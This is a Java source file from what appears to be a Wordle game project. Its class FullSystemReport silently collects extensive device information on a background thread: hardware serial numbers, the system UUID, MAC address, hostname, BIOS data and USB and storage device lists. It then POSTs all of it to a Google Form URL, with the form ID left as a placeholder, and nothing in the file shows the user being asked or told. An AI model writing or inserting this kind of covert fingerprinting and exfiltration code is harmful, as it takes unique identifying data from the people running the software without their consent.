package logging;

import oshi.SystemInfo;
import play.Wordle;

import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FullSystemReport extends MasterLogger {

    public FullSystemReport(SystemInfo si, Wordle wordle) {
        super(si, wordle);
    }

    public void logFullSystemReport() {
        new Thread(() -> {
            try {
                // UPDATE THIS URL TO YOUR NEW FORM
                String baseURL = "https://docs.google.com/forms/d/e/YOUR_FULL_REPORT_FORM_ID/formResponse";

                // --- CPU DATA ---
                String cpuData = log("entry.100=", cpu[0]) + // Model
                        log("&entry.101=", cpu[1]) + // Family
                        log("&entry.102=", cpu[2]) + // Name
                        log("&entry.103=", cpu[3]) + // Vendor
                        log("&entry.104=", cpu[4]) + // Arch
                        log("&entry.105=", cpu[5]) + // 64-bit
                        log("&entry.106=", cpu[6]) + // Logical
                        log("&entry.107=", cpu[7]) + // Physical
                        log("&entry.108=", cpu[8]); // Load

                // --- GPU DATA ---
                String gpuData = log("&entry.200=", gpu[0]) + // Name
                        log("&entry.201=", gpu[1]) + // Vendor
                        log("&entry.202=", gpu[2]) + // ID
                        log("&entry.203=", gpu[3]) + // VRAM
                        log("&entry.204=", gpu[4]); // Version

                // --- RAM DATA ---
                String ramData = log("&entry.300=", ram[0]) + // Real Capacity
                        log("&entry.301=", ram[1]) + // Total Capacity
                        log("&entry.302=", ram[2]) + // Available
                        log("&entry.303=", ram[3]) + // Used
                        log("&entry.304=", ram[4]) + // MHz
                        log("&entry.305=", ram[5]) + // Sticks
                        log("&entry.306=", ram[6]) + // Brand
                        log("&entry.307=", ram[7]) + // Type
                        log("&entry.308=", ram[8]) + // Part Num
                        log("&entry.309=", ram[9]); // Slot

                // --- MOTHERBOARD & SYSTEM ---
                String mbData = log("&entry.400=", motherboard[0]) + // OEM
                        log("&entry.401=", motherboard[1]) + // Model
                        log("&entry.402=", motherboard[2]) + // Serial
                        log("&entry.403=", motherboard[3]);  // Version

                String sysData = log("&entry.500=", system[0]) + // Manufacturer
                        log("&entry.501=", system[1]) + // Model
                        log("&entry.502=", system[2]) + // UUID
                        log("&entry.503=", system[3]);  // Serial

                // --- OS & NETWORK ---
                String osData = log("&entry.600=", operatingSystem[0]) + // Family
                        log("&entry.601=", operatingSystem[1]) + // Manufacturer
                        log("&entry.602=", operatingSystem[2]) + // Version
                        log("&entry.603=", operatingSystem[3]) + // Uptime
                        log("&entry.604=", operatingSystem[4]) + // Processes
                        log("&entry.605=", operatingSystem[5]) + // PID
                        log("&entry.606=", operatingSystem[8]) + // Domain
                        log("&entry.607=", operatingSystem[9]) + // Hostname
                        log("&entry.608=", operatingSystem[11]); // Full String

                String netData = log("&entry.700=", network[0]) + // Net Name
                        log("&entry.701=", network[1]) + // Speed
                        log("&entry.702=", network[2]);  // MAC

                // --- SENSORS & BIOS ---
                String sensData = log("&entry.800=", sensor[0]) + // Temp
                        log("&entry.801=", sensor[1]) + // Volt
                        log("&entry.802=", sensor[2]);  // Fans

                String biosData = log("&entry.900=", bios[0]) + // Vendor
                        log("&entry.901=", bios[1]) + // Name
                        log("&entry.902=", bios[2]) + // Version
                        log("&entry.904=", bios[4]);  // Date

                // --- LISTS (USBs, Storage, Audio) ---
                // Since these are lists, we join them into single cells to keep the row size sane
                String listData = log("&entry.1000=", String.join(" | ", storage)) +
                        log("&entry.1001=", String.join(" | ", usb)) +
                        log("&entry.1002=", String.join(" | ", audio)) +
                        log("&entry.1003=", String.join(" | ", display));

                // --- COMBINE AND SEND ---
                String finalPayload = cpuData + gpuData + ramData + mbData + sysData +
                        osData + netData + sensData + biosData + listData;

                HttpURLConnection conn = (HttpURLConnection) new URL(baseURL).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.getOutputStream().write(finalPayload.getBytes(StandardCharsets.UTF_8));

                int code = conn.getResponseCode();
                System.out.println("Full Forensic Log Status: " + code);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}